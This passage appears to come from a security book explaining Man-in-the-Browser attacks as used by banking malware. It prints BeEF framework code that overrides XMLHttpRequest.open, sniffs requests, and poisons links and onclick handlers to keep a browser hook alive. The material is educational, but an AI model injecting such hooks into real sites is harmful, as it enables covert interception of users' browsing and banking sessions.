
# Man-in-the-Browser vs. Man-in-the-Middle Attacks

Whereas a Man-in-the-Middle (MitM) attack generally refers to eavesdropping attacks at the network level, Man-in-the-Browser refers to eavesdropping attacks at the application level or, even better, at the browser level. A similarity with MitM is the relaying of data that was intended for the legitimate server back to the attacker. MitB techniques are used extensively by banking malware like SpyEye and Zeus15 in order to subvert the content rendered by the browser when users visit their banking websites. Page content is altered in various ways depending on the malware configuration. The final result is often a modified look and feel of the page’s HTML in order to display fake content. For instance, the login page of a banking website may be altered claiming that the bank introduced new “security” features. The user might be asked to provide more details such as date of birth, mother’s maiden name, or even second factor authentication data (for example, RSA one-time PINs). What makes these attacks hard to spot is the fact that they are completely client side, and are often not seen by the web server. This often limits the effectiveness of server-side mitigations or Web Application Firewalls. These attacks can be performed in a few different ways. One technique relies on intercepting the traffic of the infected machine when visiting the target bank site, and modifying it when it returns with new HTML content, prior to the browser rendering it. Another technique is injecting custom JavaScript that overrides the page behavior dynamically, poisoning existing web application logic and adding new content. 

* * *

end feature 

## Hijacking AJAX Calls

MitB attacks aim to hijack AJAX GET and POST requests, and they work in both same- and cross-origin scenarios. These attacks are possible thanks to the flexibility of JavaScript and the DOM. One of the great features of JavaScript is the ability to override the prototypes of built-in DOM methods.

Prototype overriding is one of the tricks used by a MitB attack to hijack AJAX requests. The following snippet from BeEF shows how the “open” method of the XMLHttpRequest object prototype is overridden with custom logic. You won’t be able to just copy this code verbatim though, as it does depend on some of BeEF’s other features too.

``` 
init:function (cid, curl) { 
  beef.mitb.cid = cid;
  beef.mitb.curl = curl;
  /*Override open method to intercept ajax request*/
  var xml_type;
  var hook_file = "<%= @hook_file %>";

  if (window.XMLHttpRequest && !(window.ActiveXObject)) {
    beef.mitb.sniff("Method XMLHttpRequest.open override");
    (function (open) {
      XMLHttpRequest.prototype.open = function (method, url, 
         async, mitb_call) {
      // Ignore it and don't hijack it.
      // It's a request part of the hook polling process
      if (mitb_call || (url.indexOf(hook_file) != -1 || \
        url.indexOf("/dh?") != -1)) {
          open.call(this, method, url, async, true);
      } else {
       var portRegex = new RegExp(":[0-9]+");
       var portR = portRegex.exec(url);
       var requestPort;
       if (portR != null) { requestPort = portR[0].split(":")[1]; }

       //GET request
       if (method == "GET") {
           //GET request -> cross-origin
           if (url.indexOf(document.location.hostname) == -1 || \
            (portR != null && requestPort != document.location.port )){
              beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
              window.open(url);
           }else {
           //GET request -> same-domain
                beef.mitb.sniff("GET [Ajax Request]: " + url);
                if (beef.mitb.fetch(url,
                  document.getElementsByTagName("html")[0])){
                var title = "";
                if(document.getElementsByTagName("title").length == 0){
                    title = document.title;
                } else {
                    title = document.getElementsByTagName(
                     "title")[0].innerHTML;
                }
                    // write the url of the page
                    history.pushState({ Be:"EF" }, title, url);
                }
           }
       }else{
       //POST request
         beef.mitb.sniff("POST ajax request to: " + url);
         open.call(this, method, url, async, true);
        }
       }
    };
  })(XMLHttpRequest.prototype.open);
  }
},
```

After the init function is called, every time XMLHttpRequest.open is used, its behavior will change according to this custom overridden implementation:

Level1 **1.** Check if the MitB itself initiated the request, or if it is part of the hook communication channel. In the second case, do not hijack it; **2.** If the request method is GET, determine if the request is same-origin or cross-origin. **3.** If same-origin, load the resource and display its content on the current page, keeping the hook alive. Replace the page title with the original one, and replace the URL bar content with the proper resource URI using the history object (history.pushState). **4.** If cross-origin, simply open the resource on a new tab (window.open) to keep the hook alive in the current tab. **5.** If the method is POST, just do the request. 

/Level1

### Hijacking Non-AJAX Requests

Non-AJAX GET and POST requests can be hijacked as well. Similar to AJAX resources, normal resources are prefetched by the MitB code, subverting default behavior (AKA poisoning) of links and forms.

For instance, if the page contains an <a> tag pointing to a same-origin resource, the MitB adds an onClick event attribute that will execute a JavaScript function. When the user clicks the link, the default behavior (GET request to a page) is prevented, and instead the new onClick event handler will manage the click event. In case the link already contains an onClick attribute, MitB replaces that method, calling a different function. The following code from BeEF is an example:

``` 
// Fetches a hooked link with AJAX
    fetch:function (url, target) {
        try {
            var y = new XMLHttpRequest();
            y.open('GET', url, false, true);
            y.onreadystatechange = function () {
                if (y.readyState == 4 && y.responseText != "") {
                    target.innerHTML = y.responseText;
                }
            };
            y.send(null);
            beef.mitb.sniff("GET: " + url);
            return true;
        } catch (x) {
            window.open(url);
            beef.mitb.sniff("GET [New Window]: " + url);
            return false;
        }
    },

// Hooks anchors and prevents them from linking away
    poisonAnchor:function (e) {
        try {
            e.preventDefault;
            if (beef.mitb.fetch(e.currentTarget, 
              document.getElementsByTagName("html")[0])) {
               var title = "";
               if(document.getElementsByTagName("title").length == 0){
                title = document.title;
               }else{
                title = document.getElementsByTagName(
                 "title")[0].innerHTML;
               }
                history.pushState({ Be:"EF" }, title, e.currentTarget);
            }
        } catch (e) {
          console.error('beef.mitb.poisonAnchor - failed to execute: '+
            e.message);
        }
        return false;
    },

var anchors = document.getElementsByTagName("a");
var lis = document.getElementsByTagName("li");

        for (var i = 0; i < anchors.length; i++) {
            anchors[i].onclick = beef.mitb.poisonAnchor;
        }
      
        for (var i = 0; i < lis.length; i++) {
            if (lis[i].hasAttribute("onclick")) {
                lis[i].removeAttribute("onclick");
                /*clear*/
                lis[i].setAttribute("onclick", "beef.mitb.fetchOnclick(
                 '"+lis[i].getElementsByTagName("a")[0] + "')");
                /*override*/

            }
        }
```
